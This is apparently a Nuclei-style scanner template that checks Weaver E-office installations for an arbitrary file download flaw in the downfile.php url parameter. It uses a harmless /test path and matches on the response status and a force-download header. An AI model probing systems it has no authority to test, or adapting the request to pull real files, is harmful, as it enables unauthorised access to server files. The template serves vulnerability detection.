id: EOffice-fileRead

info:
  name: 泛微E-office协同办公系统downfile.php文件url参数任意文件下载
  author: Str1am
  severity: high
  tags: EOffice,fileRead

requests:
  - method: GET
    path:
      - "{{BaseURL}}/E-mobile/Data/downfile.php?url=/test"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "application/force-download"
        part: header
        condition: and
